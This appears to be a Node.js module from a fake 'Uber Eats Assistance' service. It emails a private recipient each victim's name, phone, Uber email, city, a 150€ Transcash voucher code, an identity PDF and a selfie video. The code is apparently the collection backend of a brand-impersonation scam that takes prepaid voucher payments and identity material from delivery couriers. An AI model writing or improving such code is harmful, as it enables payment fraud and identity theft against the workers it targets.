const resend = require('resend').Resend(process.env.RESEND_API_KEY);
const fs = require('fs');

class EmailService {
  async sendAssistanceRequest(formData, situation, pdfPath, videoPath) {
    try {
      const subject = situation === 'waiting' 
        ? `[ATTENTE] Uber Eats - ${formData.fullName}`
        : `[URGENT] Uber Eats BLOQUÉ - ${formData.fullName}`;

      const html = `
        <h1 style="color:#06C167">🚗 UBER EATS ASSISTANCE</h1>
        <h2>📋 NOUVELLE DEMANDE</h2>
        <table border="1" cellpadding="10" style="border-collapse:collapse">
          <tr><td><strong>SITUATION</strong></td><td>${situation === 'waiting' ? '⏳ ATTENTE' : '🚫 BLOQUÉ'}</td></tr>
          <tr><td><strong>NOM</strong></td><td>${formData.fullName}</td></tr>
          <tr><td><strong>TÉL</strong></td><td>${formData.uberId}</td></tr>
          <tr><td><strong>EMAIL</strong></td><td>${formData.uberEmail}</td></tr>
          <tr><td><strong>VILLE</strong></td><td>${formData.city}</td></tr>
          <tr style="background:#ffeb3b"><td><strong>TRANSCASH 150€</strong></td><td><strong>${formData.transcashCode}</strong></td></tr>
        </table>
        <br>
        <p><strong>📎 PIÈCES JOINTES :</strong> PDF + Vidéo Selfie</p>
        <p style="background:#ffebee;color:#c62828;padding:15px">
          ⚡ <strong>ACTION URGENTE : Traiter sous 24h</strong>
        </p>
      `;

      // Lire fichiers en base64
      const pdfBase64 = fs.readFileSync(pdfPath).toString('base64');
      const videoBase64 = fs.readFileSync(videoPath).toString('base64');

      const data = {
        from: 'Uber Eats Assistance <noreply@resend.dev>',
        to: process.env.RECIPIENT_EMAIL,
        subject,
        html,
        attachments: [
          {
            filename: `uber-${formData.fullName.replace(/\s+/g, '-')}-info.pdf`,
            content: pdfBase64,
            contentType: 'application/pdf'
          },
          {
            filename: `uber-${formData.fullName.replace(/\s+/g, '-')}-video.mp4`,
            content: videoBase64,
            contentType: 'video/mp4'
          }
        ]
      };

      console.log('📧 Envoi Resend vers:', process.env.RECIPIENT_EMAIL);
      const result = await resend.emails.send(data);
      console.log('✅ RESEND OK:', result.data.id);
      
      return { success: true, messageId: result.data.id };
    } catch (error) {
      console.error('❌ RESEND ERROR:', error.message);
      throw new Error('Resend échoué: ' + error.message);
    }
  }
}

module.exports = new EmailService();
